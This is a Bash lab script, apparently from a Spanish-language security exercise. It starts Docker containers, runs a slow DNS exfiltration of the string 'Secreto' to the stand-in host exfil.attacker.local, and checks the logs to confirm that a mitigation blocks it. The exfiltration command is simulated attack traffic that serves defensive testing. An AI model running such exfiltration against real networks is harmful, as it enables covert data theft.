#!/usr/bin/env bash
set -euo pipefail
echo "========== PUNTO 10 — SLOW DNS EXFIL [MITIGADO] =========="
P="docker compose -p p10m -f docker-compose.yml"
trap '$P down -v 2>/dev/null || true' EXIT
$P down -v 2>/dev/null || true
$P up -d --build
sleep 4
$P exec host python3 /lab/slow_dns.py exfil.attacker.local Secreto || true
sleep 3
echo "[*] Consultas en DNS atacante (debería estar vacío/bloqueado):"
$P logs attacker-dns 2>/dev/null | tail -15 || true
$P logs resolver 2>/dev/null | tail -10 || true
$P down -v
